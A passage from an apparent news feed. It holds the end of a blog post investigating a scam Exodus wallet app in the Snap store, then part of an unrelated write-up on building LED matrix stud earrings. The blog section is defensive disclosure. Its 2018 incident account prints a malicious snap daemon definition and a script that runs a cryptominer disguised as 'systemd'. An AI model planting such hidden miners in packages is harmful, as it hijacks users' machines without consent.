boxes and pressed the button.</p><p><a href="https://popey.com/blog/images/2024-02-20/scam-exodus-app-3.png"><img src="https://popey.com/blog/images/2024-02-20/scam-exodus-app-3_70.png" alt="Scam exodus app"></a></p><p><strong>“❗ You (sic) wallet is not imported. You (sic) data is not valid!”</strong></p><p>My hunch was that the application poked some online API to unlock “my” wallet. So in the background, I had <a href="https://snapcraft.io/bandwhich">bandwhich</a> running in a terminal.</p><p><em>I know tools like <code>tcpdump</code> or Wireshark exist, along with all manner of other deep packet analysis tools. I just wanted to give the application a quick ‘shake’ to know if it tried to do something online.</em></p><p>Sure enough, there were a few requests sent to a Linode IP, and others to Cloudflare.</p><p><a href="https://popey.com/blog/images/2024-02-20/scam-exodus-app-4.png"><img src="https://popey.com/blog/images/2024-02-20/scam-exodus-app-4_70.png" alt="Scam exodus app"></a></p><p>Visiting one of those IPs redirects to <a href="https://www.exchangerate-api.com/">https://www.exchangerate-api.com/</a> who are “The Accurate &amp; Reliable
Exchange Rate API”. Unsurprisingly, the API call failed because I entered a garbage wallet recovery phrase.</p><p><a href="https://popey.com/blog/images/2024-02-20/exchangerate-api.png"><img src="https://popey.com/blog/images/2024-02-20/exchangerate-api_60.png" alt="Exchange rate API"></a></p><h2 id="bad-news">Bad news</h2><p>My untested theory is that if I had entered a valid recovery phrase, my online wallet would be accessed, and then emptied via an API call. I presume this is what happened to “castle”.</p><p>I edited my <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/2">response</a> to let the user know what I’d discovered and tagged the security team in the thread.</p><blockquote><p>It certainly doesn’t look official to me, based on the following simple check:</p><ul><li>The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.</li><li>The exodus snap is a flutter application, not built using electron.</li></ul><p>So it could be someone making their own Exodus application, it doesn’t look official.</p><p>I installed the snap in a separate VM. It opens with a “Restore Wallet” dialog. If I enter random letters, it connects to some API at <a href="https://www.exchangerate-api.com/">https://www.exchangerate-api.com/</a> and fails (because I didn’t enter a real wallet phrase).</p><p>Sadly, looks very dodgy.</p><p>I’ve sent an email to the security team. Also @security ^^</p></blockquote><p>Separately, I also emailed the security team at Canonical and reported the application via the web form on the Exodus page in the Snap store.</p><p><a href="https://popey.com/blog/images/2024-02-20/report-this-app-1.png"><img src="https://popey.com/blog/images/2024-02-20/report-this-app-1.png" alt="Report this app link"></a></p><p>The “Report this app” link is at the bottom of every Snap store page on <a href="https://snapcraft.io/">https://snapcraft.io/</a>. It takes seconds to fill in.</p><p><a href="https://popey.com/blog/images/2024-02-20/report-this-app-2_100.png"><img src="https://popey.com/blog/images/2024-02-20/report-this-app-2_70.png" alt="Report this app form"></a></p><p>That’s about as much as I could do for now.</p><h2 id="how-does-this-happen-an-aside">How does this happen? (an aside)</h2><p>How is it that people can so easily publish scam Bitcoin wallet applications in the Snap store?</p><p>Frankly, it’s by design. One of the goals is to automate the whole Snapcraft publishing and review pipeline so there’s fewer (expensive and slow) humans in the loop.</p><p>To register a name for any application in the store, all a scammer needs is a store account. They can use any old email address, and create a store account in minutes. They don’t need to pay, give a business address or validate their identity with a government ID.</p><p>Once they have a store account, they can login with the command-line <code>snapcraft</code> tool, used for building their dodgy snap.</p><p><code>snapcraft login MySuperGenuineAndLegitEmailHonestGuv@example.com</code></p><p>Then register the unique name for their dodgy snap.</p><p><code>snapcraft register mysuperbadwallet</code></p><p>Writing the application is not beyond any semi-competent app developer. Packaging the program as a snap is well documented, and comes with free community support. Although I imagine they’d have to ask for help with packaging their “<em>Modern network-enabled desktop application</em>” rather than with a “<em>Scam Bitcoin Wallet app</em>”.</p><p>The next step is to validate that the package will pass the automated Snap store review tools. Simply run <code>snap-review mysuperbadwallet.snap</code> and fix any errors it reports.</p><p>Uploading is as simple as <code>snapcraft upload mysuperbadwallet.snap --release=stable</code>. Once it’s uploaded and processed, the package will be <em>immediately</em> searchable, and available for <em>anyone</em>, almost <em>anywhere</em> to download, install and run it.</p><p>No humans in the loop. What could possibly go wrong?</p><p><a href="https://en.wikipedia.org/wiki/WarGames"><img src="https://popey.com/blog/images/2024-02-20/humansoutoftheloop.png" alt="Removing humans from the process never caused problems in Hollywood! /s"></a></p><h2 id="further-research">Further research</h2><p><em>Back to the scam Exodus Wallet snap…</em></p><p>The snapped application will have access to the <code>$HOME</code> directory, but not any hidden files or directories within home. This has always been seen as a useful protection against an application grubbing around in hidden folders, hoovering up wallets, ssh &amp; GPG keys, and other secrets.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~$ snap connections exodus
</span></span><span><span>Interface                 Plug                    Slot                             Notes
</span></span><span><span>content<span>[</span>gnome-3-28-1804<span>]</span>  exodus:gnome-3-28-1804  gnome-3-28-1804:gnome-3-28-1804  -
</span></span><span><span>content<span>[</span>gtk-3-themes<span>]</span>     exodus:gtk-3-themes     gtk-common-themes:gtk-3-themes   -
</span></span><span><span>content<span>[</span>icon-themes<span>]</span>      exodus:icon-themes      gtk-common-themes:icon-themes    -
</span></span><span><span>content<span>[</span>sound-themes<span>]</span>     exodus:sound-themes     gtk-common-themes:sound-themes   -
</span></span><span><span>desktop                   exodus:desktop          :desktop                         -
</span></span><span><span>desktop-legacy            exodus:desktop-legacy   :desktop-legacy                  -
</span></span><span><span>gsettings                 exodus:gsettings        :gsettings                       -
</span></span><span><span>home                      exodus:home             :home                            -
</span></span><span><span>network                   exodus:network          :network                         -
</span></span><span><span>opengl                    exodus:opengl           :opengl                          -
</span></span><span><span>wayland                   exodus:wayland          :wayland                         -
</span></span><span><span>x11                       exodus:x11              :x11                             -
</span></span></code></pre></div><p>But this application didn’t <em>need</em> to do that. All it needed was to look vaguely legit, and ask for a recovery phrase, then use the automatically-connected <code>network</code> interface to poke an online API to do their evil bidding.</p><p>Pretty clever, really.</p><p>I wondered if there might be others affected by this application. I did a few online searches to see if anyone had mentioned the snap. The only post I found was in a <a href="https://boards.4chan.org/biz/thread/57569971/exodus-wallet-help">thread on 4chan</a> (warning, 4chan link, duh), timed similarly to the Snapcraft forum thread.</p><p>In the 4chan thread, they revealed similar details to the Snapcraft discussion. However, they also pasted the transaction ID and the Bitcoin wallet the funds had been sent to. A little over 9 BTC was sent to one destination. At the time of writing that amount of Bitcoin was worth in the region of $490K, but that value changes often.</p><p><a href="https://www.walletexplorer.com/wallet/32394c8892f2076c"><img src="https://popey.com/blog/images/2024-02-20/byebyebitcoin50.png" alt="Bye bye bitcoin"></a></p><p>I didn’t find any other contemporary reports of people being suckered by this snap. But then again, if someone got suckered, they might be inclined to keep it to themselves, or only talk about it on anonymous places like 4chan!</p><h2 id="gone-but-not-forgotten">Gone, but not forgotten</h2><p>The Canonical security team responded to me late on the same Sunday night to say ’thanks’ and that the application had already been removed from the store. Probably as a result of me hitting the “Report this app” button. It’s good to see that they respond promptly on the weekend.</p><p>That’s not the end of the story though. While the application is now in ‘quarantine’, and cannot be downloaded, <strong>the scam Exodus wallet application is still installed on machines out in the wild</strong>. Nothing seems to have been done to solve that.</p><p>The Exodus Wallet snap is a ticking timebomb out there on who knows how many computers. Anyone who installed it between 6th Feb and 12th Feb 2024 could one day open it, erroneously thinking it’s official, type in their wallet recovery code and lose everything.</p><h2 id="not-the-first-crypto-rodeo-aside">Not the first crypto rodeo (aside)</h2><p>This isn’t the first time a cryptocurrency scam has been published in the Snap store.</p><h3 id="minercraft">MinerCraft</h3><p>Back in May 2018, when I <em>was</em> working for Canonical, we had one of our first high-profile crypto incidents. A bad actor downloaded existing game snaps from the store, unpacked and re-packed them with a bonus cryptocurrency miner on board.</p><p>They achieved this by adding a snippet to the <code>snapcraft.yaml</code> that launched a simple background daemon once the 2048buntu snap was installed.</p><div><pre tabindex="0"><code data-lang="yaml"><span><span>   <span>deamonx</span>:
</span></span><span><span>     <span>command</span>: <span>command-deamonx.wrapper</span>
</span></span><span><span>     <span>daemon</span>: <span>simple</span>
</span></span><span><span>     <span>plugs</span>:
</span></span><span><span>     - <span>network</span>
</span></span><span><span>     - <span>network-bind</span>
</span></span><span><span>     - <span>home</span>
</span></span></code></pre></div><p>The <code>command-deamonx.wrapper</code> was a simple script to setup the environment, which then launched a further script called <code>start</code>.</p><div><pre tabindex="0"><code data-lang="bash"><span><span><span>#!/bin/sh
</span></span></span><span><span><span></span>export PATH<span>=</span><span>"</span>$SNAP<span>/usr/sbin:</span>$SNAP<span>/usr/bin:</span>$SNAP<span>/sbin:</span>$SNAP<span>/bin:</span>$PATH<span>"</span>
</span></span><span><span>export LD_LIBRARY_PATH<span>=</span><span>"</span>$LD_LIBRARY_PATH<span>:</span>$SNAP<span>/lib:</span>$SNAP<span>/usr/lib:</span>$SNAP<span>/lib/x86_64-linux-gnu:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu/mesa-egl:</span>$SNAP<span>/usr/lib/x86_64-linux-gnu/mesa"</span>
</span></span><span><span>export LD_LIBRARY_PATH<span>=</span>$SNAP_LIBRARY_PATH:$LD_LIBRARY_PATH
</span></span><span><span>exec <span>"desktop-launch"</span> <span>"</span>$SNAP<span>/start"</span> <span>"</span>$@<span>"</span>
</span></span></code></pre></div><p>The <code>start</code> script launched a miner, sending any mined crypto to the publisher of the dodgy snap, who hid behind a protonmail account.</p><div><pre tabindex="0"><code data-lang="bash"><span><span><span>#!/bin/bash
</span></span></span><span><span><span></span>
</span></span><span><span>currency<span>=</span>bcn
</span></span><span><span>name<span>=</span>2048buntu
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>{</span> <span># try</span>
</span></span><span><span>/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>1</span> -g
</span></span><span><span><span>}</span> <span>||</span> <span>{</span> <span># catch</span>
</span></span><span><span>cores<span>=(</span><span>$(</span>grep -c ^processor /proc/cpuinfo<span>)</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>if</span> <span>((</span> $cores &lt; <span>4</span> <span>))</span>; <span>then</span>
</span></span><span><span>    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>1</span>
</span></span><span><span><span>else</span>
</span></span><span><span>    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency <span>2</span>
</span></span><span><span><span>fi</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Once published these “Games with benefits” were downloaded by perhaps a hundred or more users. Along with the game they all got a bonus crypto miner running in the background on their computer.</p><p>Perhaps amusingly, the miner was disguised as a process called <code>systemd</code>, which could plausibly &amp; legitimately be consuming processing time on a client computer.</p><p>Canonical was <a href="https://github.com/canonical/snapcraft.io/issues/651">notified</a> via GitHub issue, by someone who spotted this early on Friday 11th May. I found out on Saturday morning while away from my PC, watching a football game. I pinged around some people out-of-hours and we had the applications unlisted from the store.</p><p>The following week, while back at our desks, and after considerable discussion and rumination, we figured out a plan to <em>un-minerize</em> the client machines. For clients, the Snap store is effectively anonymous, so we couldn’t notify people by email or popup that their machine was compromised.</p><p>We considered the options and eventually decided to pull a benevolent version of the <a href="https://www.theguardian.com/technology/2009/jul/17/amazon-kindle-1984">Amazon Kindle 1984 debacle</a>. We took ownership of the three games, re-packaged them <em>without</em> the crypto miner, and published that as an update to the Snap store.</p><p>Anyone who’d had the game+miner installed would get an automatic update, typically within a few hours of powering their computer on. This meant they could keep the game, and we’d throw away the miner.</p><p>The result being there were no longer versions of the miner running on client machines.</p><p>Now, some might argue this was a bad way to do it, and perhaps they’re right. It honestly felt like the least-worst option at the time though.</p><p><em>Thinking about this in retrospect, we likely could have done something better here. The contents could have been replaced by a largely empty snap, which opens a URL in the default browser when opened. That URL could point to an official Snapcraft forum page which details an up-to-date list of quarantined snaps, and why they were removed.</em></p><p>Canonical published a <a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">blog post</a> once word got out. I’ve personally never been very happy with that non-response and wasn’t involved in the drafting of it. But it is what it is.</p><h3 id="leaky-ledger-live">Leaky Ledger Live</h3><p>Skipping forward, between 16th and 18th September 2023, someone uploaded a “Ledger Live” Bitcoin wallet snap to the Snap store. Ten days later, a user <a href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045">reported</a> that they’d been scammed out of $10K by the “Ledger Live” snap, published in the Snap store.</p><p>In a post titled “<a href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045">Phishing app on the snap store – is my computer compromised?</a>” they asked:</p><blockquote><p>The <a href="https://snapcraft.io/ledgerlive">https://snapcraft.io/ledgerlive</a> app is a phishing app disguising as the official app for <a href="https://www.ledger.com/">https://www.ledger.com/</a></p><p>The way it works is that it queries you for your backup code (a list of words). In a dumb lapse of judgement I was scammed by this app and lost a substantial amount of money.</p><p>What worries me more is that my computer/passwords/files could be compromised. But if I understand it correctly, snaps are isolated somehow? Could it have read my filesystem?</p><p>What do you recommend I do?</p></blockquote><p>A similar thread at the same time was <a href="https://www.reddit.com/r/ledgerwallet/comments/16tqe79/warning_snap_version_of_liveledger_is_fraudulent/">reported</a> in <a href="https://www.reddit.com/r/ledgerwallet/">/r/ledgerwallet</a> on <a href="https://www.reddit.com/">Reddit</a>. So again, likely the same person doing both reports.</p><blockquote><p>I just got scammed for about 10.000 USD by <a href="https://snapcraft.io/ledgerlive">https://snapcraft.io/ledgerlive</a></p><p>I hadn’t used my ledger in years and stupidly entered the 24 word passpharse into the app.</p><p>I’ll see how I’ll try to report this to snap, but just wanted to put the warning out there.</p></blockquote><p>They followed up <a href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045/7">later</a> on the forum:</p><blockquote><p>The cryptocurrency was transferred out of my Wallet against my will to an unknown address.</p></blockquote><p>After the September 2023 incident, Canonical <em>temporarily</em> <a href="https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077">suspended</a> unrestricted registration of snap names.</p><p>A month later, that limitation was <a href="https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077/8">lifted</a> with the comment:</p><blockquote><p>“Instead, we will be conducting daily reviews of new snaps being uploaded. We will flag, investigate and take down any snap that looks suspicious. We are taking this action to remove friction from the snap publishing experience, whilst still closely monitoring what is being uploaded on a regular basis.”</p></blockquote><p>They <strong>aren’t</strong> monitoring and investigating closely enough though!</p><p><strong>They missed the Exodus snap uploaded on the 6th of February 2024, which then caught someone out to the tune of nearly half a million dollars, six days later!</strong></p><h2 id="not-enough">Not enough</h2><p>Thankfully it’s no longer possible for new users to install the scam Exodus wallet application. However, that doesn’t help the people who still have the application installed on their computers.</p><p>It’s very likely that many people inadvertently installed the application believing it was genuine, but have yet to fall into the trap of entering their security credentials.</p><p><strong>This is a series of ticking time bombs, waiting to go off.</strong></p><p>Or, perhaps the bomb has already gone off, multiple times, taking funds in the process, but people can’t or don’t want to speak up. Maybe they haven’t figured out what happened yet.</p><h2 id="what-now">What now?</h2><p>Following the February 2024 incident, a discussion thread titled “<a href="https://forum.snapcraft.io/t/should-unverified-cryptocurrency-apps-be-banned/38919">Should unverified cryptocurrency apps be banned?</a>” was started on the Snapcraft forum. After a week it’s had only one reply, a hundred or so views, and has already dropped below thirty other threads on the front page.</p><p>I’m not privy to internal conversations inside Canonical. I suspect the recent event - and with any luck (humbly) - this blog post - may trigger further discussion and concrete plans. I certainly hope so.</p><h2 id="in-summary-the-tldr">In summary (the tl;dr)</h2><p>Multiple genuine-looking scam cryptocurrency miners and fake Bitcoin wallet applications have been published in the Snap store since 2018. The latest has cost at least one person nearly half a million dollars in Bitcoin.</p><p><strong>Some of these scam applications are still installed on end-user computers.</strong></p><h3 id="may-2018">May 2018</h3><p>Three open-source games were forked, a cryptocurrency miner was added, and these were re-uploaded to the Snap store under another name</p><ul><li>Once discovered the games were quarantined, the malware removed and a clean version was pushed out to users</li><li>Canonical <a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">announced</a> their intention to do nothing about this, and invited discussion which publicly appeared to go nowhere</li></ul><h3 id="september-2023">September 2023</h3><p>A glut of scam cryptocurrency applications were published, with a user reporting some monetary loss.</p><ul><li>The applications were quarantined, making them unavailable for further download</li><li>No update was pushed out to clean client systems of the malware</li><li>No announcement was made informing users who had the malware still installed, on how to clean it up</li></ul><h3 id="february-2024">February 2024</h3><p>More scam cryptocurrency applications were published leading to significant financial loss for a user.</p><ul><li>The applications were quarantined, thus making them unavailable for download</li><li>No update was pushed out to clean client systems of the malware</li><li>No announcement has yet been made informing users who have the malware, on how to clean it up</li></ul><p><strong>As far as I am aware, some of the known scam crypto applications that have been published in the Snap store are still installed on client systems.</strong></p><h3 id="what-users-should-do">What users should do</h3><p>Remove all of the following snaps from their systems with <code>snap remove --purge &lt;snapname&gt;</code>. They are all ‘private’ in the Snap store, so their store pages show ‘404’, and the software cannot <em>currently</em> be downloaded.</p><p>These first three are ’technically’ okay because they were cleaned of malware and then updated in the store. So anyone who had the malware payload should have had it removed if they installed updates - which is automatic by default with snap. Earlier revisions still have the malware though.</p><ul><li>2048buntu</li><li>hextris</li><li>freecraft</li></ul><p>These may or may not have contained malware, misfeatures or other scammy things. So it’s best to remove them all.</p><ul><li>bip-web</li><li>bitwallet</li><li>btcwal</li><li>btcwallet</li><li>coinbase</li><li>cryptowal</li><li>electrum-wallet2</li><li>exodus</li><li>exoduswal</li><li>exoduswalet</li><li>exodwallet</li><li>guarda</li><li>komodo</li><li>ledger-live-wallet</li><li>ledger1</li><li>ledgerlive</li><li>liveledger</li><li>metamask</li><li>new-electrum-wallet</li><li>sparrow</li><li>sparrow-wallet</li><li>sparrowwalet</li><li>sparrowwallet</li><li>trezor-wallet</li><li>trezorwallet</li><li>trustwallet</li></ul><p>Here’s a one-liner to get rid of them all:</p><p><code>for s in 2048buntu hextris freecraft bip-web bitwallet btcwal btcwallet coinbase cryptowal electrum-wallet2 exodus exoduswal exoduswalet exodwallet guarda komodo ledger-live-wallet ledger1 ledgerlive liveledger metamask new-electrum-wallet sparrow sparrow-wallet sparrowwalet sparrowwallet trezor-wallet trezorwallet trustwallet; do sudo snap remove --purge $s; done</code></p><h3 id="what-i-think-canonical-should-do-urgently">What I think Canonical should do urgently</h3><p>These suggestions are to reduce the opportunity for a bad actor to publish a similar scam application.</p><ul><li>Mandate &amp; verify that all published applications using financial and/or cryptocurrency branding are officially published directly by the upstream developers</li><li>Change the store so <strong>all</strong> initial Snapcraft store name registrations are gated behind human review</li><li>Gate the first month of a new snap uploads behind human review</li><li>Block <em>all</em> interface connection requests behind a human review, including automatically connected ones like <code>network</code> and <code>home</code></li><li>Fully staff the team doing the above to respond to registration, interface connection and upload requests in a timely fashion</li><li>Send out a clean snap update (as we did in 2018) to all clients that have the scam snaps still installed</li></ul><h3 id="what-i-think-canonical-should-seriously-consider-next">What I think Canonical should seriously consider next</h3><p>Additional steps to enable users to have more confidence in the applications published in Snap store.</p><ul><li>Publishers should have their ’newness’ on the platform highlighted with a ‘New Publisher’ badge</li><li>Snaps that are less than <code>$M</code> (2?) months old should have a ‘New Application’ badge</li><li>Snaps that have fewer than <code>$N</code> (50?) installs should not appear in search results</li><li>The store should make prominent notes to users that newly published snaps and snaps from new publishers should be viewed with extreme caution</li><li>Provide better education to users on the risks of installing finance and cryptocurrency software from the Snap store</li><li>Review and update all wording in graphical and web software store-fronts to ensure users aren’t given a false impression that malware is ‘safe’</li></ul><h3 id="what-canonical-should-not-do">What Canonical should not do</h3><ul><li>Nothing</li><li>Blame the user</li><li><a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">This</a> kind of response</li><li>Celebrate that being a target for bad actors means the platform is now big and successful</li></ul><h2 id="conclusion">Conclusion</h2><p>I have used Ubuntu most days for nearly 20 years. I contribute to, advocate for, and support Ubuntu users. I also publish numerous snaps in the Snap store.</p><p>I want both Ubuntu and Snapcraft be secure, successful and safe projects. I want to be able to recommend them to friends, without having to warn them about dodgy software in the Snap store.</p><p>Canonical can do better here.</p></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LED Matrix Earrings (489 pts)]]></title>
            <link>https://mitxela.com/projects/ledstud</link>
            <guid>39446537</guid>
            <pubDate>Tue, 20 Feb 2024 20:34:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mitxela.com/projects/ledstud">https://mitxela.com/projects/ledstud</a>, See on <a href="https://news.ycombinator.com/item?id=39446537">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="mxmain"><p><a href="https://mitxela.com/projects/hardware"><img onload="this.style.opacity=1;" src="https://mitxela.com/img/titles/mitxela_dot_com-65.png" title="Back to Hardware" alt="Back to Hardware"></a></p><p>20 Feb 2024<br><b>Progress: Complete</b></p><p>
I originally imagined the <a href="https://mitxela.com/projects/scaffold">LED Industrial Piercing</a> as a project specifically to make use of 0201 LEDs. In the end, they weren't even necessary. 0201 LEDs are just too small! Evidently, we needed to go deeper, so the purpose of this next project was to stick as many as possible of them onto the face of a stud earring.</p><p>

Watch the following youtube video for an extensively narrated journey.</p><p>

<iframe width="704" height="396" src="https://www.youtube.com/embed/CHoGIvOi-jw" allowfullscreen=""></iframe></p><p>

Continue reading this page for an in-depth explanation.</p><h3>Design</h3><p>
These off-the-shelf LED stud earrings are very cheap. They have a tiny machined battery holder for two LR521 cells. The idea was to replace the plastic gemstone and single LED with our own circuit board, re-using the metalwork.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/ots.jpg" alt="Off-the-shelf LED stud earrings"></p><p>

Electrically, the circuit and firmware would be identical to <a href="https://mitxela.com/projects/badge">the badge</a> I recently created using a CH32V003. Read that page for the story behind it and an explanation of how it works.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/badge/badgeon.jpg" alt="Badge illuminated"></p><p>

The challenge here is shrinking the design of the badge by a factor of 3 (or one-ninth the area) by shifting from an LED pitch of 3mm down to 1mm. We also insisted on not having a thick border around the board. This poses quite a challenge for routing the tracks.</p><p>

To give a sense of scale, here's three 0201 LEDs next to a regular surface mount LED:</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/led-comparison.jpg" alt="Comparison of three 0201 LEDs with a regular SMD LED"></p><p>

Or, to really put it in perspective, an 0201 LED on the back of an ATtiny85:</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/attiny.jpg" alt="0201 LED on the back of an ATtiny85"></p><h3>Homebrew blind and buried vias</h3><p>
It's possible to get multilayer boards made with so-called blind and/or buried vias. The limit is far, far beyond what we're working with here. The "redistribution layer" of BGA packages is normally built as a very small, high-density circuit board. These often have very fine pin pitches and use blind vias, via-in-pad, and so on. The point is we could easily order a circuit board to these tolerances – if we had the cash for it.</p><p>

A small batch of HDI boards starts at several hundred dollars, and the more complex the stackup the more the price goes up. I would very much like to keep this entire project under $50 total.</p><p>

I decided to craft my own circuit board sandwich, two two-layer boards held together by an array of solder pads.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/board-render1.jpg" alt="3D render of the board"></p><p>

I wasn't sure if this was going to work. I put all the pads around around the perimeter, partly with the idea that I could inspect all the connections, of course that would mean removing the boards from the panel to do so, which I didn't want to do until the rest of the board is assembled. I suppose we could have started by fitting the components, and sandwiching the boards last, but that sounds like a recipe for disaster.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/board-render2.jpg" alt="3D render of the board"></p><p>

The drill diameter for the vias is 0.25mm, which puts us just into the second tier of board pricing (almost all of the cheapest PCB offers have minimum 0.3mm). It may have been possible to do a layout of 0201 LEDs within the cheapest tolerance, but I didn't want to risk it. Remember the distance from one LED to the next is 1mm. At this sort of scale, the copper thickness around a plated hole is noticeably uneven.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/board-kicad.png" alt="KiCad screenshot"></p><h3>Solder sandwich</h3><p>
As usual, I combined postage with several other orders, which leads to a mini-christmas when they all arrive.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/bare-board.jpg" alt="Unpopulated board, with a pile of others in the background"></p><p>

The main display is an 8x8 matrix at 1mm pitch. With the corners cut off to fit into the round profile, that adds up to 52 LEDs within a 9mm diameter circle. The panel top and bottom is 5mm wide. The whole panel is 23mm by 28.5mm.</p><p>

I stencilled paste onto one of the boards, and sat an unpasted board on top of it. The symmetrical panel helps ensure perfect alignment.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/sandwich1.jpg" alt="Two boards, one stencilled with paste, ready to sandwich"></p><p>

The total board thickness is 0.6mm, so our sandwich ends up a little over 1.2mm. This was reflowed in a fairly uneventful way.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/sandwich2.jpg" alt="Board sandwich"></p><p>

I probably should have used higher temperature solder for this step, as it would reduce the risk of these joints separating later on. On the other hand, I didn't want to risk messing this up, those pads are still quite small at 0.5mm diameter and it's not like I keep a whole range of solder pastes in stock. (They have a shelf life, and go off after a few months anyway.)</p><h3>Paste paste paste</h3><p>
I ordered a steel stencil along with the boards. I fit about six other designs into it, but even ordering a stencil for one board is normally viable, they're unbelievably cheap for what they are.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/stencil.jpg" alt="Closeup of stencil with finger for scale"></p><p>

My first mistake was not putting the fiducials on the stencil. Aligning the first board was easy enough, we could use the QFN pads to confirm it, but after cutting one board out of the panel, aligning the second board was very difficult.</p><p>

My second mistake is possibly making the holes for the 0201 pads too small. I probably could have gotten away with a smidgen larger, which would have made the stencilling process less stressful.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/stencil2.jpg" alt="Stencilling attempt"></p><p>

The first attempt wasn't too shabby, most of those pads are perfect with just a few under-pasted. I wiped this off and tried again a few times, I feel like with exactly the right amount of pressure and speed with the squeegee it should be possible to get it perfect.</p><p>

I didn't quite manage perfection, but got close enough to feel like moving onwards. I did clean the stencil at this point, but not sufficiently. The remaining residue would dry up and cause me to have a much less fun time when it came to the second earring.</p><h3>Pick and place</h3><p>
Presuming the reader has already watched the video, or at least perused the previous projects of the badge and the <a href="https://mitxela.com/projects/candle">volumetric display</a>, it goes without saying that I planned to position the parts with the pick and place machine.</p><p>

0201 is well beyond the specified tolerance of it, so this was something of a gamble. It's not impossible to place 52 0201 LEDs by hand if it came to it, but I was really curious to see if I could do this, and if so, what further projects that opens up in future.</p><p>

The machine came with a selection of vacuum nozzles, most of which are cylindrical, but the very smallest is this shape.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/nozzle.jpg" alt="Close up of small vacuum nozzle"></p><p>

That oblong tip is a comparable size to the parts we're trying to pick up, so it wasn't clear if this would work, but in the end it didn't seem to have any problems in this aspect.</p><p>

The construction of the machine appears to be little more than a glorified 3D printer, but evidently it's built to a much sturdier tolerance. Once I'd calibrated the position of the components, it placed the first one absolutely spot-on.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/firstplace.jpg" alt="Placement of first component"></p><p>

The problems I initially encountered were less about component placement and more about the tape misbehaving. I have the machine on a very sturdy desk, but it still shakes about as it operates. This means parts as small as an 0201 LED are likely to go flying if the protective film on the tape is pulled back. The holes in the tape are at a 4mm pitch, just like all the other tapes, and most parts, even quite small ones, are placed at a 4mm spacing. It's only when you get to 0402 and 0201 that parts are placed at a closer spacing than the holes in the tape. This poses something of a problem for the mechanism used to advance the tape: the head has a solenoid pin which it inserts into a hole and pulls it forwards. For tapes with a 2mm spacing, it needs to advance by half a step instead of a full one.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/tapes.jpg" alt="Labelled tapes in the machine: 0603, 0402, 0201 and SOT23"></p><p>

The machine is able to do this, but the key factor in getting it to pick parts reliably was to offset the position of where it picks up the part out of the tape. The zero position is almost 4mm away from the area where the film is peeled back, which offered far too much leeway for parts to bounce away.</p><p>

I'll fast forward to the end of the first attempt.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/placement.jpg" alt="Top down view of LEDs placed on board"></p><p>

All in all I was pretty impressed with that. There's an obvious systematic error, all of the parts are a little too low, but that's just my inaccurate calibration, the placement is very consistent with itself. A few of the parts are skewwhiff, it's not clear if they jumped as they were put down, or if there was an error in the vision system. Even a small rounding error in the OpenCV outline logic could lead to it placing the parts at a weird angle. Luckily it's trivial to push the odd part back into place.</p><p>

After reflow, virtually all of them snapped into a perfect grid alignment. </p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/reflowed1.jpg" alt="LEDs after reflow"></p><p>

The result is quite a bit more consistent than my second attempt on video, just because I did a much worse job of stencilling the paste that time.</p><p>

Populating the back of the board was somewhat uneventful.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/reflowed2.jpg" alt="Rear side of the circuit"></p><p>

Uneventful, but not without suspense! It wasn't until this point we get to check if any of it works of course.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/firsttest.jpg" alt="Circuit illuminated"></p><p>

Sweet.</p><p>

After chopping this out of the surrounding frame, we took a moment to do some vanity shots with a coin for scale.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/coin1.jpg" alt="Circuit on a 50p coin"></p><p>

The 50p coin is of course a little large, so here's another shot on a 5p coin, much more appropriate.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/coin2.jpg" alt="Circuit on a 5p coin"></p><h3>Stud preparation</h3><p>
Under the plastic gemstone, the stud earring has a tiny circuit board with two components on it.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/stud1.jpg" alt="LED stud with gemstone removed"></p><p>

The case is the positive terminal of the battery. The negative terminal is a fine wire through the middle of the post. We just need to connect our circuit to these two points.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/assembly1.jpg" alt="Circuit ready to be set into the earring"></p><p>

